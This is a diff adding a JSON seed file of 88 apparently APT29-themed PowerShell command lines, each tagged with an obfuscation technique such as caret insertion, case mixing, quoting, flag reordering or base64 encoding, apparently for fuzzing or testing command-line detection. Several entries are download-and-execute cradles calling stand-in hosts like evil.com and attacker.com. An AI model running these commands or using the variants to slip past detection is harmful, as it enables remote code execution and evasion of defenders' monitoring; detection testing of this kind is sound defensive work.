@@ -1,0 +1,884 @@
+{
+  "seeds": [
+    {
+      "id": "apt29_seed_001",
+      "string": "powershell.exe -ep bypass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_002",
+      "string": "powershell.exe -ExecutionPolicy bypass -Command Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_003",
+      "string": "powershell -exec bypass -nop -c \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_004",
+      "string": "powershell.exe -nop -w hidden -enc V2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_005",
+      "string": "powershell -EncodedCommand R2V0LVByb2Nlc3M=",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_006",
+      "string": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_007",
+      "string": "powershell -w hidden -ep bypass -c Get-Service",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_008",
+      "string": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-Host",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_009",
+      "string": "powershell -nop -ep bypass -c [System.Environment]::OSVersion",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_010",
+      "string": "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_011",
+      "string": "powershell -c \"Invoke-WebRequest -Uri http://evil.com/malware.exe -OutFile C:\\temp\\malware.exe\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_012",
+      "string": "powershell.exe -ex bypass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_013",
+      "string": "powershell -executionpolicy bypass -command whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "base",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_014",
+      "string": "powershell.exe \"-ep\" bypass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "insertion_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_015",
+      "string": "powershell.exe -ep by\"\"pass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "insertion_double_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_016",
+      "string": "powershell.exe -ExecutionPolicy by\"\"pass -Command Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "insertion_double_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_017",
+      "string": "powershell.exe -Execution  Policy bypass -Command Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "insertion_spaces",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_018",
+      "string": "powershell -exec by\"\"pass -nop -c \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "insertion_double_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_019",
+      "string": "powershell.exe -ExecutionPolicy bypass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "substitution_ep",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_020",
+      "string": "powershell.exe -ep bypass -Command Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "substitution_ExecutionPolicy",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_021",
+      "string": "powershell -ExecutionPolicyec bypass -nop -c \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "substitution_ex",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_022",
+      "string": "powershell.exe -nop -w hidden -EncodedCommand V2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "substitution_enc",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_023",
+      "string": "powershell -enc R2V0LVByb2Nlc3M=",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "substitution_EncodedCommand",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_024",
+      "string": "powershell.exe -WindowStyle Hidden -ep Bypass -Command whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "substitution_ExecutionPolicy",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_025",
+      "string": "powershell -w hidden -ExecutionPolicy bypass -c Get-Service",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "substitution_ep",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_026",
+      "string": "powershell.exe -NoProfile -ep Bypass -Command Get-Host",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "substitution_ExecutionPolicy",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_027",
+      "string": "powershell -ep bypass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "omission_exe",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_028",
+      "string": "powershell -ExecutionPolicy bypass -Command Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "omission_exe",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_029",
+      "string": "powershell -exec bypass -c \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "omission_noprofile",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_030",
+      "string": "powershell -nop -w hidden -enc V2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "omission_exe",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_031",
+      "string": "powershell.exe -w hidden -enc V2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "omission_noprofile",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_032",
+      "string": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "omission_exe",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_033",
+      "string": "powershell.exe -c bypass -ep whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "reordering_swap_flags",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_034",
+      "string": "powershell.exe -c -ep bypass whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "reordering_move_last",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_035",
+      "string": "powershell.exe -Command bypass -ExecutionPolicy Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "reordering_swap_flags",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_036",
+      "string": "powershell.exe -Command -ExecutionPolicy bypass Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "reordering_move_last",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_037",
+      "string": "powershell -nop bypass -exec -c \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "reordering_swap_flags",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_038",
+      "string": "powershell -c -exec bypass -nop \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "reordering_move_last",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_039",
+      "string": "powershell.exe -w -nop hidden -enc V2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "reordering_swap_flags",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_040",
+      "string": "powershell.exe -enc -nop -w hidden V2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "reordering_move_last",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_041",
+      "string": "powershell.exe -ep bypass -c -EncodedCommand d2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "recoding_base64",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_042",
+      "string": "po^wer^shell.exe -ep bypass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_caret",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_043",
+      "string": "PoWeRsHeLl.eXe -Ep bYpAsS -c wHoAmI",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_case_mixing",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_044",
+      "string": "\"powershell\".exe -ep bypass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_045",
+      "string": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_env_var",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_046",
+      "string": "po^wer^shell.exe -ExecutionPolicy bypass -Command Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_caret",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_047",
+      "string": "PoWeRsHeLl.eXe -ExEcUtIoNpOlIcY ByPaSs -CoMmAnD GeT-PrOcEsS",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_case_mixing",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_048",
+      "string": "\"powershell\".exe -ExecutionPolicy bypass -Command Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_049",
+      "string": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy bypass -Command Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_env_var",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_050",
+      "string": "po^wer^shell -exec bypass -nop -c \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_caret",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_051",
+      "string": "PoWeRsHeLl -ExEc bYpAsS -nOp -C \"iEx((NeW-ObJeCt nEt.wEbClIeNt).DoWnLoAdStRiNg('HtTp://eViL.CoM/PaYlOaD'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_case_mixing",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_052",
+      "string": "\"powershell\" -exec bypass -nop -c \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_053",
+      "string": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell -exec bypass -nop -c \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_env_var",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_054",
+      "string": "po^wer^shell.exe -nop -w hidden -enc V2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_caret",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_055",
+      "string": "PoWeRsHeLl.eXe -NoP -w hIdDeN -eNc v2hVyW1P",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_case_mixing",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_056",
+      "string": "\"powershell\".exe -nop -w hidden -enc V2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_057",
+      "string": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -enc V2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_env_var",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_058",
+      "string": "po^wer^shell -EncodedCommand R2V0LVByb2Nlc3M=",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_caret",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_059",
+      "string": "PoWeRsHeLl -EnCoDeDcOmMaNd r2v0lVbYb2nLc3m=",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_case_mixing",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_060",
+      "string": "\"powershell\" -EncodedCommand R2V0LVByb2Nlc3M=",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_061",
+      "string": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell -EncodedCommand R2V0LVByb2Nlc3M=",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_env_var",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_062",
+      "string": "po^wer^shell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_caret",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_063",
+      "string": "PoWeRsHeLl.eXe -WiNdOwStYlE HiDdEn -ExEcUtIoNpOlIcY ByPaSs -CoMmAnD WhOaMi",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_case_mixing",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_064",
+      "string": "\"powershell\".exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_065",
+      "string": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_env_var",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_066",
+      "string": "po^wer^shell -w hidden -ep bypass -c Get-Service",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_caret",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_067",
+      "string": "PoWeRsHeLl -W HiDdEn -Ep bYpAsS -c gEt-sErViCe",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_case_mixing",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_068",
+      "string": "\"powershell\" -w hidden -ep bypass -c Get-Service",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_069",
+      "string": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell -w hidden -ep bypass -c Get-Service",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_env_var",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_070",
+      "string": "po^wer^shell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-Host",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_caret",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_071",
+      "string": "PoWeRsHeLl.eXe -NoPrOfIlE -eXeCuTiOnPoLiCy bYpAsS -cOmMaNd gEt-hOsT",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_case_mixing",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_072",
+      "string": "\"powershell\".exe -NoProfile -ExecutionPolicy Bypass -Command Get-Host",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_073",
+      "string": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-Host",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_env_var",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_074",
+      "string": "po^wer^shell -nop -ep bypass -c [System.Environment]::OSVersion",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_caret",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_075",
+      "string": "PoWeRsHeLl -NoP -eP ByPaSs -C [sYsTeM.EnViRoNmEnT]::OsVeRsIoN",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_case_mixing",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_076",
+      "string": "\"powershell\" -nop -ep bypass -c [System.Environment]::OSVersion",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_077",
+      "string": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell -nop -ep bypass -c [System.Environment]::OSVersion",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_env_var",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_078",
+      "string": "po^wer^shell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_caret",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_079",
+      "string": "PoWeRsHeLl.eXe -C IeX(NeW-ObJeCt nEt.wEbClIeNt).DoWnLoAdStRiNg('HtTp://aTtAcKeR.CoM/PaYlOaD.Ps1')",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_case_mixing",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_080",
+      "string": "\"powershell\".exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_quotes",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_081",
+      "string": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "traditional_env_var",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_082",
+      "string": "powershell -ExecutionPolicy bypass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "hybrid_omission_substitution",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_083",
+      "string": "Po^WeR^sHeLl.exe -ep bypass -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "hybrid_caret_case",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_084",
+      "string": "powershell.exe bypass \"-ep\" -c whoami",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "hybrid_insertion_reorder",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_085",
+      "string": "Po^WeR^sHeLl.exe -ExecutionPolicy bypass -Command Get-Process",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "hybrid_caret_case",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_086",
+      "string": "Po^WeR^sHeLl -exec bypass -nop -c \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "hybrid_caret_case",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_087",
+      "string": "Po^WeR^sHeLl.exe -nop -w hidden -enc V2hvYW1p",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "hybrid_caret_case",
+      "last_used": 0
+    },
+    {
+      "id": "apt29_seed_088",
+      "string": "Po^WeR^sHeLl -EncodedCommand R2V0LVByb2Nlc3M=",
+      "q_s": 0.1,
+      "n_s": 0,
+      "invalid_count": 0,
+      "cluster_id": 1,
+      "technique": "hybrid_caret_case",
+      "last_used": 0
+    }
+  ]
+}
